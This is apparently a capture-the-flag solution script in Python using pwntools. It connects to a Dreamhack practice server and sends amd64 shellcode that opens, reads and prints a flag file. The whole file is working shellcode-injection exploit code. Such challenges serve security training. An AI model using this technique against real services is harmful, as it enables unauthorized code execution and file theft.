from pwn import *

context(arch="amd64", os="linux")

p = remote("host3.dreamhack.games",17850)

shellcode = shellcraft.open("/home/shell_basic/flag_name_is_loooooong")
shellcode += shellcraft.read("rax","rsp",100)
shellcode += shellcraft.write(1,"rsp",100)

p.recvuntil("shellcode:")
p.send(asm(shellcode))

print(p.recvline())
